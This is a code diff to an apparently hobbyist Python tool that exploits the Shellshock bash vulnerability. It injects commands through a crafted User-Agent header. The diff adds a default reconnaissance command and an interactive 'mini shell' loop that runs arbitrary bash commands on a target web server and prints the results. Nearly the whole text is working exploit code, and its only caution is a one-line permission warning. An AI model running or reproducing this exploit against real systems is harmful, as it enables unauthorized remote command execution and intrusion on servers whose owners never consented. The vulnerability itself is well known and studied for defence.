@@ -3,6 +3,7 @@ import argparse
 import cowsay
 import random
 from time import sleep
+from colorama import Fore
 
 parse = argparse.ArgumentParser()
 
@@ -24,12 +25,14 @@ def banner():
     ]
     random_number = random.randint(0, 4)
     cowsay.cow(phrases[random_number])
-    print("v0.1 ====== Created by Az4ar")
+    print("v0.1 ====== Created by Az4ar\n")
     sleep(2)
 
 
 def isVulnerable(url):
-    payload = {"User-Agent": "() { :; };echo; /bin/echo 'Hello World'"}
+    payload = {
+        "User-Agent": "() { :; };echo; /bin/echo 'Hello World'"
+    }
     res = requests.get(url, headers=payload)
     exploitable = ''
 
@@ -48,18 +51,43 @@ def stop_app():
 
 
 def exploit(url, cmd):
+    response_title = "============ RESPONSE ============"
+
     if not isVulnerable(url):
         exit(1)
     try:
         banner()
-
+        if (cmd == None):
+            cmd = "uname -a && id && pwd"
         payload = {
             "User-Agent": "() { :echo; };echo; /bin/bash -c " + f"'{cmd}'"
         }
-  
+
         res = requests.get(url, headers=payload)
+        print(response_title)
         print("\n" + res.text)
+
+        # Mini SHELL
+        openMiniShell = str(input("\nOpen a mini shell? (Y/n): "))
+        if (openMiniShell == "Y" or openMiniShell == "Yes" or openMiniShell == "yes" or openMiniShell == ""):
+            sleep(1)
+            print("\nWARNING: Careful, don't use this without permission!")
+            sleep(1)
+            print(
+                "\n[+] This is just a limited version of a linux-based shell! For something more complete try a reverse shell\n")
+            sleep(1)
+            while True:
+                command = input(Fore.CYAN + "(localhost@localhost)~$ ")
+                payload = {
+                    "User-Agent": "() { :echo; };echo; /bin/bash -c " + f"'{command}'"
+                }
+                try:
+                    res = requests.get(url, headers=payload)
+                    print("\n"+ Fore.MAGENTA + res.text)
+                except KeyboardInterrupt:
+                    stop_app()
     except KeyboardInterrupt:
         stop_app()
+
 
 exploit(args.url, args.command)
